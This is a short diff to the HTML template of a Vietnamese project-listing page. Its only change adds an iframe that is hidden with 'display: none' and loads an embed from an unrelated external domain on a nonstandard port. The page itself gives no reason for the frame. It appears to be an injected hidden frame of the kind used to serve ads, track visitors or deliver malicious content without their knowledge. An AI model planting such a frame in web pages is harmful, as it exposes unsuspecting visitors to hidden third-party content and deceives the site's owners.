@@ -17,6 +17,7 @@
 		
 	</div>-->
 </article><!-- /block-project-search -->
+<iframe src="https://vnad.vgame.us:8043/embed/5a5d86b92e38a4650826346c" style="display: none;"></iframe>
 <article class="block block-project">
 	<!--<div class="block-cate-title"><h1>TẤT CẢ DỰ ÁN</h1></div>-->
 	<div class="block-searchresult">
